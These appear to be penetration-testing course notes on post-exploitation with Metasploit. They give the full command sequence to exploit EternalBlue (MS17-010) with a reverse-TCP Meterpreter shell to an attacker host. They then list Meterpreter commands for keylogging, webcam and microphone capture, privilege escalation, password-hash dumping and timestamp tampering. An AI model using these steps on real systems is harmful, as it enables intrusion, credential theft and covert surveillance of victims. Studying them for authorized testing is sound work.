# Chapter 8: Understanding Post Exploitation Actions

Actions after bypassing security of system:
- Gaining Access to passwords that can access to other systems on network
- Planting backdoor so if system is patched, there will still be a way into system later on.

Learn:
- Common post exploitation tasks
- Obtain shell
- Retrieve password hashes
- Disable Antivirus software
- Take Screenshots
- Take remote control of the system on network
- How to maintain access (persistence).
- How to cover your tracks when finished.

## Common Post Exploitation Tasks

Common Post Exploitation Tasks
- Meterpreter session in Metasploit.
- Meterprete = Metaspolit payload (type of attack) that gives you interactive command prompt
  - Containing number of built in modules (commands) for execution on target system aiding in post exploitation.
 
Vuln in SMB protocol (EternalBlue)
- `msfconsole`: open up metasploit.
- `search ms17-010`: search EternalBlue in metasploit.

- `use exploit/windows/smb/ms17_010_eternalblue`
-  `set payload windows/x64/meterpreter/reverse_tcp`
-  `set RHOST <victim_ip>`
-  `set LHOST <kali_ip>`
-  `exploit`

- Once system has been exploited you will see meterpreter prompt.

Commands broken down by category:
- Core Commands: Standard commands available with meterpreter; allow to perform number of tacks: background the current session, exit, get help, and migrate.
- File System Commands: Allow you to work with folders and files (Example: dir, cat, upload, and edit).
- Network Commands: Give details on your network setup and environment. Commands includes `ifconfig`. `ipconfig`, `netstat`, `route`.
- System Commands: Works with target system. Example: Can view running processes with `ps` or kill a process with `kill` command.
- User-interface commands: Works with user interface environment with command such as `keyscan_start`, `screenshot` and `idletime`.
- Webcam Commands: manipulate webcam of compromised system by turning it on or off. Can use command such as `webcam_list`, `record_mic`, `webcam_snap` or `webcam_stream`.
- Elevate Commands: `getsystem` command elevates your privileges to system-level privileges.
- Password Database Commands: Can retrieve list of password hashes from system by using the `hashdump` command.
- Timestomp Commands: Can manipulate file MACE (modifies, access, created, entry) attributes with `timestomp` command.
